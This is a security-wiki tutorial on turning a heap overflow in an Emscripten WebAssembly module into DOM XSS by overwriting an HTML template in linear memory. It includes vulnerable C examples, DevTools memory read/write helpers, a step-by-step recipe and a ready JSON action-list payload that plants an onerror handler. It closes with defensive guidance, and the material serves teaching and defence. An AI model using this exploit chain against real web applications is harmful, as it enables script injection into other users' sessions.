# WebAssembly linear memory corruption to DOM XSS (template overwrite)

{{#include ../../banners/hacktricks-training.md}}

This technique shows how a memory-corruption bug inside a WebAssembly (WASM) module compiled with Emscripten can be weaponized into a reliable DOM XSS even when input is sanitized. The pivot is to corrupt writable constants in WASM linear memory (e.g., HTML format templates) instead of attacking the sanitized source string.

Key idea: In the WebAssembly model, code lives in non-writable executable pages, but the module’s data (heap/stack/globals/"constants") live in a single flat linear memory (pages of 64KB) that is writable by the module. If buggy C/C++ code writes out-of-bounds, you can overwrite adjacent objects and even constant strings embedded in linear memory. When such a constant is later used to build HTML for insertion via a DOM sink, you can turn sanitized input into executable JavaScript.

Threat model and preconditions
- Web app uses Emscripten glue (Module.cwrap) to call into a WASM module.
- Application state lives in WASM linear memory (e.g., C structs with pointers/lengths to user buffers).
- Input sanitizer encodes metacharacters before storage, but later rendering builds HTML using a format string stored in WASM linear memory.
- There is a linear-memory corruption primitive (e.g., heap overflow, UAF, or unchecked memcpy).

Minimal vulnerable data model (example)
```c
typedef struct msg {
    char *msg_data;       // pointer to message bytes
    size_t msg_data_len;  // length after sanitization
    int msg_time;         // timestamp
    int msg_status;       // flags
} msg;

typedef struct stuff {
    msg *mess;            // dynamic array of msg
    size_t size;          // used
    size_t capacity;      // allocated
} stuff; // global chat state in linear memory
```

Vulnerable logic pattern
- addMsg(): allocates a new buffer sized to the sanitized input and appends a msg to s.mess, doubling capacity with realloc when needed.
- editMsg(): re-sanitizes and memcpy’s the new bytes into the existing buffer without ensuring the new length ≤ old allocation → intra‑linear‑memory heap overflow.
- populateMsgHTML(): formats sanitized text with a baked stub like "<article><p>%.*s</p></article>" residing in linear memory. The returned HTML lands in a DOM sink (e.g., innerHTML).

Allocator grooming with realloc()
```c
int add_msg_to_stuff(stuff *s, msg new_msg) {
    if (s->size >= s->capacity) {
        s->capacity *= 2;
        s->mess = (msg *)realloc(s->mess, s->capacity * sizeof(msg));
        if (s->mess == NULL) exit(1);
    }
    s->mess[s->size++] = new_msg;
    return s->size - 1;
}
```
- Send enough messages to exceed the initial capacity. After growth, realloc() often places s->mess immediately after the last user buffer in linear memory.
- Overflow the last message via editMsg() to clobber fields inside s->mess (e.g., overwrite msg_data pointers) → arbitrary pointer rewrite within linear memory for data later rendered.

Exploit pivot: overwrite the HTML template (sink) instead of the sanitized source
- Sanitization protects input, not sinks. Find the format stub used by populateMsgHTML(), e.g.:
  - "<article><p>%.*s</p></article>" → change to "<img src=1      onerror=%.*s>"
- Locate the stub deterministically by scanning linear memory; it is a plain byte string within Module.HEAPU8.
- After you overwrite the stub, sanitized message content becomes the JavaScript handler for onerror, so adding a new message with text like alert(1337) yields <img src=1 onerror=alert(1337)> and executes immediately in the DOM.

Chrome DevTools workflow (Emscripten glue)
- Break on the first Module.cwrap call in the JS glue and step into the wasm call site to capture pointer arguments (numeric offsets into linear memory).
- Use typed views like Module.HEAPU8 to read/write WASM memory from the console.
- Helper snippets:
```javascript
function writeBytes(ptr, byteArray){
  if(!Array.isArray(byteArray)) throw new Error("byteArray must be an array of numbers");
  for(let i=0;i<byteArray.length;i++){
    const byte = byteArray[i];
    if(typeof byte!=="number"||byte<0||byte>255) throw new Error(`Invalid byte at index ${i}: ${byte}`);
    HEAPU8[ptr+i]=byte;
  }
}
function readBytes(ptr,len){ return Array.from(HEAPU8.subarray(ptr,ptr+len)); }
function readBytesAsChars(ptr,len){
  const bytes=HEAPU8.subarray(ptr,ptr+len);
  return Array.from(bytes).map(b=>(b>=32&&b<=126)?String.fromCharCode(b):'.').join('');
}
function searchWasmMemory(str){
  const mem=Module.HEAPU8, pat=new TextEncoder().encode(str);
  for(let i=0;i<mem.length-pat.length;i++){
    let ok=true; for(let j=0;j<pat.length;j++){ if(mem[i+j]!==pat[j]){ ok=false; break; } }
    if(ok) console.log(`Found "${str}" at memory address:`, i);
  }
  console.log(`"${str}" not found in memory`);
  return -1;
}
const a = bytes => bytes.reduce((acc, b, i) => acc + (b << (8*i)), 0); // little-endian bytes -> int
```

End-to-end exploitation recipe
1) Groom: add N small messages to trigger realloc(). Ensure s->mess is adjacent to a user buffer.
2) Overflow: call editMsg() on the last message with a longer payload to overwrite an entry in s->mess, setting msg_data of message 0 to point at (stub_addr + 1). The +1 skips the leading '<' to keep tag alignment intact during the next edit.
3) Template rewrite: edit message 0 so its bytes overwrite the template with: "img src=1      onerror=%.*s ".
4) Trigger XSS: add a new message whose sanitized content is JavaScript, e.g., alert(1337). Rendering emits <img src=1 onerror=alert(1337)> and executes.

Example action list to serialize and place in ?s= (Base64-encode with btoa before use)
```json
[
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"add","content":"hi","time":1756840476392},
  {"action":"edit","msgId":10,"content":"aaaaaaaaaaaaaaaa.\u0000\u0001\u0000\u0050","time":1756885686080},
  {"action":"edit","msgId":0,"content":"img src=1      onerror=%.*s ","time":1756885686080},
  {"action":"add","content":"alert(1337)","time":1756840476392}
]
```

Why this bypass works
- WASM prevents code execution from linear memory, but constant data inside linear memory is writable if program logic is buggy.
- The sanitizer only protects the source string; by corrupting the sink (the HTML template), sanitized input becomes the JS handler value and executes when inserted into the DOM.
- realloc()-driven adjacency plus unchecked memcpy in edit flows enables pointer corruption to redirect writes to attacker-chosen addresses within linear memory.

Generalization and other attack surface
- Any in-memory HTML template, JSON skeleton, or URL pattern embedded in linear memory can be targeted to change how sanitized data is interpreted downstream.
- Other common WASM pitfalls: out-of-bounds writes/reads in linear memory, UAF on heap objects, function-table misuse with unchecked indirect call indices, and JS↔WASM glue mismatches.

Defensive guidance
- In edit paths, verify new length ≤ capacity; resize buffers before copy (realloc to new_len) or use size-bounded APIs (snprintf/strlcpy) and track capacity.
- Keep immutable templates out of writable linear memory or integrity-check them before use.
- Treat JS↔WASM boundaries as untrusted: validate pointer ranges/lengths, fuzz exported interfaces, and cap memory growth.
- Sanitize at the sink: avoid building HTML in WASM; prefer safe DOM APIs over innerHTML-style templating.
- Avoid trusting URL-embedded state for privileged flows.

## References
- [Pwning WebAssembly: Bypassing XSS Filters in the WASM Sandbox](https://zoozoo-sec.github.io/blogs/PwningWasm-BreakingXssFilters/)
- [V8: Wasm Compilation Pipeline](https://v8.dev/docs/wasm-compilation-pipeline)
- [V8: Liftoff (baseline compiler)](https://v8.dev/blog/liftoff)
- [Debugging WebAssembly in Chrome DevTools (YouTube)](https://www.youtube.com/watch?v=BTLLPnW4t5s&t)
- [SSD: Intro to Chrome exploitation (WASM edition)](https://ssd-disclosure.com/an-introduction-to-chrome-exploitation-webassembly-edition/)

{{#include ../../banners/hacktricks-training.md}}